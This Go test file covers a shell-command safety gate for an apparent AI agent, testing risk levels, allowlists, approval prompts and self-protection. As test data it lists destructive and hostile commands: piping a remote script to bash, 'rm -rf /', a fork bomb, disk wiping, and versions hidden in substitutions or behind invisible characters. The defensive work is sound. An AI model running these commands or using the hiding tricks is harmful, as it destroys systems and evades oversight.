package cmdgate

import (
	"context"
	"testing"
	"time"
)

var testEnv = Env{SelfNames: []string{"macron"}, SelfDB: []string{"/var/lib/macron/macron.db"}}

func TestAnalyzeLevels(t *testing.T) {
	cases := []struct {
		cmd   string
		level Level
		rule  string
	}{
		{"ls -la", Safe, ""},
		{"echo hi > out.txt", Safe, ""},
		{"git status", Safe, ""},
		{"rm file.txt", Safe, ""},
		{"rm -rf ./build", Dangerous, "rm-recursive"},
		{"curl https://x.sh | bash", Dangerous, "pipe-to-shell"},
		{"chmod -R 777 /", Dangerous, "chmod-open"},
		{"echo ok > /etc/passwd", Dangerous, "system-config"},
		{"sqlite3 /var/lib/macron/macron.db 'delete from users'", Dangerous, "sql-destructive"},
		{"rm -rf /", Hardline, "rm-root"},
		{"rm -rf ~", Hardline, "rm-home"},
		{"rm -rf /etc", Hardline, "rm-system"},
		{"sudo rm -rf /var", Hardline, "rm-system"},
		{":(){ :|:& };:", Hardline, "fork-bomb"},
		{"dd if=/dev/zero of=/dev/sda", Hardline, "dd-device"},
		{"mkfs.ext4 /dev/sdb1", Hardline, "mkfs"},
		{"shutdown now", Hardline, "power"},
		{"systemctl stop macron", Hardline, "self-protect"},
		{"pkill macron", Hardline, "self-protect"},
		// Hidden inside substitutions, subshells and invisible characters.
		{"echo $(rm -rf /)", Hardline, "rm-root"},
		{"echo `rm -rf /`", Hardline, "rm-root"},
		{"bash -c 'rm -rf /'", Hardline, "rm-root"},
		{"true && rm -rf /", Hardline, "rm-root"},
		{"rm​ -rf /", Hardline, "rm-root"},
	}
	for _, c := range cases {
		f := Analyze(c.cmd, testEnv)
		if got := Worst(f); got != c.level {
			t.Errorf("%q: level %d, want %d (findings %+v)", c.cmd, got, c.level, f)
			continue
		}
		if c.rule != "" && f[0].Rule != c.rule {
			t.Errorf("%q: rule %q, want %q", c.cmd, f[0].Rule, c.rule)
		}
	}
}

func TestGlob(t *testing.T) {
	cases := []struct {
		pattern, s string
		want       bool
	}{
		{"rm -rf *", "rm -rf ./build", true},
		{"RM *", "rm x", true},
		{"git push*", "git status", false},
		{"a?c", "abc", true},
		{"a?c", "ac", false},
		{"*", "", true},
		{"", "x", false},
	}
	for _, c := range cases {
		if got := Glob(c.pattern, c.s); got != c.want {
			t.Errorf("Glob(%q, %q) = %v, want %v", c.pattern, c.s, got, c.want)
		}
	}
}

func TestNormal(t *testing.T) {
	if got := Normal("  rm   -rf\t./x ​"); got != "rm -rf ./x" {
		t.Errorf("Normal = %q", got)
	}
}

func TestParse(t *testing.T) {
	s := Parse(`a 'b c' | d > out; e && f $(g h)`)
	if len(s.Pipelines) != 3 {
		t.Fatalf("pipelines = %d, want 3: %+v", len(s.Pipelines), s.Pipelines)
	}
	first := s.Pipelines[0]
	if len(first) != 2 || first[0].Words[1] != "b c" || first[1].Redirs[0] != (Redir{Op: ">", Target: "out"}) {
		t.Errorf("first pipeline = %+v", first)
	}
	if len(s.Nested) != 1 || s.Nested[0] != "g h" {
		t.Errorf("nested = %q", s.Nested)
	}
}

type memStore struct {
	allow []string
	log   []Entry
}

func (m *memStore) Allowlist() []string        { return m.allow }
func (m *memStore) AddAllow(p string) error    { m.allow = append(m.allow, p); return nil }
func (m *memStore) Audit(e Entry)              { m.log = append(m.log, e) }
func asking(c Choice, n *int) Asker            { return func(context.Context, Question) Choice { *n++; return c } }
func manual() Policy                           { return Policy{Mode: ModeManual, Breaker: 3} }
func withAsk(c Choice, n *int) context.Context { return WithAsker(context.Background(), asking(c, n)) }

func TestGateSafeRunsWithoutAsking(t *testing.T) {
	g := New(testEnv, false)
	g.Policy = manual
	n := 0
	if v := g.Check(withAsk(Deny, &n), "s", "ls -la"); !v.Allow || n != 0 {
		t.Fatalf("safe command: allow=%v asked=%d", v.Allow, n)
	}
}

func TestGateHardlineNeverRuns(t *testing.T) {
	g := New(testEnv, true) // even with yolo on from boot
	g.Policy = func() Policy { return Policy{Mode: ModeOff} }
	g.Store = &memStore{allow: []string{"rm -rf /"}}
	n := 0
	if v := g.Check(withAsk(Once, &n), "s", "rm -rf /"); v.Allow || n != 0 {
		t.Fatalf("hardline: allow=%v asked=%d", v.Allow, n)
	}
}

func TestGateDenyRuleBeatsAllowlist(t *testing.T) {
	g := New(testEnv, false)
	g.Policy = func() Policy { return Policy{Mode: ModeOff, Deny: []string{"rm -rf *"}} }
	g.Store = &memStore{allow: []string{"rm -rf ./build"}}
	if v := g.Check(context.Background(), "s", "rm -rf ./build"); v.Allow {
		t.Fatal("deny rule should win")
	}
}

func TestGateAllowlist(t *testing.T) {
	g := New(testEnv, false)
	g.Policy = manual
	g.Store = &memStore{allow: []string{"rm -rf ./*"}}
	if v := g.Check(context.Background(), "s", "rm -rf ./build"); !v.Allow {
		t.Fatalf("allowlisted: %s", v.Message)
	}
}

func TestGateUnattendedNeverAsks(t *testing.T) {
	g := New(testEnv, false)
	g.Policy = manual
	n := 0
	ctx := WithOrigin(withAsk(Once, &n), OriginCron)
	if v := g.Check(ctx, "s", "rm -rf ./build"); v.Allow || n != 0 {
		t.Fatalf("cron: allow=%v asked=%d", v.Allow, n)
	}
	// Once unattended, a nested origin cannot make it attended again.
	if WithOrigin(ctx, OriginUser) != ctx {
		t.Fatal("origin downgrade allowed")
	}
}

func TestGateNoAskerRefuses(t *testing.T) {
	g := New(testEnv, false)
	g.Policy = manual
	if v := g.Check(context.Background(), "s", "rm -rf ./build"); v.Allow {
		t.Fatal("nobody to approve, but it ran")
	}
}

func TestGateChoices(t *testing.T) {
	cmd := "rm -rf ./build"

	g := New(testEnv, false)
	g.Policy = manual
	n := 0
	g.Check(withAsk(Once, &n), "s", cmd)
	g.Check(withAsk(Once, &n), "s", cmd)
	if n != 2 {
		t.Errorf("once: asked %d times, want 2", n)
	}

	g, n = New(testEnv, false), 0
	g.Policy = manual
	g.Check(withAsk(Session, &n), "s", cmd)
	g.Check(withAsk(Session, &n), "s", "rm   -rf ./build")
	g.Check(withAsk(Session, &n), "other", cmd)
	if n != 2 {
		t.Errorf("session: asked %d times, want 2 (once per session)", n)
	}
	g.ForgetSession("s")
	g.Check(withAsk(Session, &n), "s", cmd)
	if n != 3 {
		t.Errorf("after ForgetSession: asked %d times, want 3", n)
	}

	st := &memStore{}
	g, n = New(testEnv, false), 0
	g.Policy, g.Store = manual, st
	g.Check(withAsk(Always, &n), "s", cmd)
	if len(st.allow) != 1 || st.allow[0] != cmd {
		t.Errorf("always: allowlist = %q", st.allow)
	}
}

func TestGateBreakerStopsAfterRepeatedRefusals(t *testing.T) {
	g := New(testEnv, false)
	g.Policy = manual
	n := 0
	ctx := withAsk(Deny, &n)
	for i := 1; i <= 2; i++ {
		if v := g.Check(ctx, "s", "rm -rf ./build"); v.Allow || v.Stop {
			t.Fatalf("refusal %d: allow=%v stop=%v", i, v.Allow, v.Stop)
		}
	}
	if v := g.Check(ctx, "s", "rm -rf ./build"); !v.Stop {
		t.Fatal("third refusal should stop the job")
	}
}

func TestGateGuardian(t *testing.T) {
	smart := func() Policy { return Policy{Mode: ModeSmart, Breaker: 3} }
	for _, c := range []struct {
		risk      Risk
		wantAllow bool
		wantAsk   int
	}{{RiskLow, true, 0}, {RiskHigh, false, 0}, {RiskUnsure, true, 1}} {
		g := New(testEnv, false)
		g.Policy = smart
		g.Guardian = func(context.Context, string, string, []Finding) (Risk, string, error) { return c.risk, "because", nil }
		n := 0
		v := g.Check(withAsk(Once, &n), "s", "rm -rf ./build")
		if v.Allow != c.wantAllow || n != c.wantAsk {
			t.Errorf("guardian %s: allow=%v asked=%d", c.risk, v.Allow, n)
		}
	}
}

func TestGateYoloWindow(t *testing.T) {
	g := New(testEnv, false)
	g.Policy = manual
	if on, _ := g.Yolo(); on {
		t.Fatal("yolo on by default")
	}
	g.SetYolo(time.Minute)
	if v := g.Check(context.Background(), "s", "rm -rf ./build"); !v.Allow {
		t.Fatal("yolo should allow a dangerous command")
	}
	g.SetYolo(0)
	if on, _ := g.Yolo(); on {
		t.Fatal("yolo still on after SetYolo(0)")
	}
}

func TestCheckpointSnapshot(t *testing.T) {
	g := New(testEnv, false)
	g.Policy = func() Policy { return Policy{Mode: ModeOff, Checkpoints: true} }
	v := g.Check(context.Background(), "s", "rm -rf ./build")
	if !v.Allow || len(v.Snapshot) == 0 {
		t.Fatalf("want a snapshot of the removed path, got %+v", v)
	}
}
